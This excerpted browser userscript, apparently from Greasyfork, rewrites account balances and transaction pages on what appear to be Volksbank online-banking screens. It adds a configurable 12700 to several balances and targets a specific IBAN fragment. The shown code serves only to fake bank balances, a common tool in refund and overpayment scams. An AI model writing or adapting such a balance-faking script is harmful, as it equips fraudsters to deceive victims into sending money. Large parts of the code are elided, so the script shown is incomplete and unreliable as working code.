// ==UserScript==
// @name         Ed 4Rec Spard da-kret@web.de
...
// @run-at       document-end
// @downloadURL https://update.greasyfork.org/scripts/503419/Ed%204Rec%20Spard%20da-kret%40webde.user.js
// @updateURL https://update.greasyfork.org/scripts/503419/Ed%204Rec%20Spard%20da-kret%40webde.meta.js
// ==/UserScript==
...
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
   ...
   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  12700},
        { index: 1, adjustmentAmount: 12700},
        { index: 2, adjustmentAmount: 12700},
...
//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------
    ...
    var targetTextContent1 = "DE42 1209 6597";
    var targetTextContent2 = " 0006 1254 33";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 12700.0; // Adjust the amount as needed
